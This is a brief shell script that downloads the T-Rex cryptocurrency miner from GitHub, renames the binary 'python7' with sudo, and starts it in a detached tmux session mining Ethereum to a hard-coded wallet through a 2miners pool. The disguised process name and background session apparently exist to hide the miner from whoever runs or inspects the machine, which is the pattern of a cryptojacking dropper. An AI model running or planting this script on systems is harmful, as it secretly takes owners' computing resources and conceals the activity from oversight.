#!/bin/sh
wget https://github.com/trexminer/T-Rex/releases/download/0.24.2/t-rex-0.24.2-linux.tar.gz
tar -xf t-rex-0.24.2-linux.tar.gz
sudo mv t-rex python7
tmux new-session -d -s my_session4 "./python7 -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x2fd9EB3c66C491443C09d9F10634602C909992Dd -p x -w rig2"
top
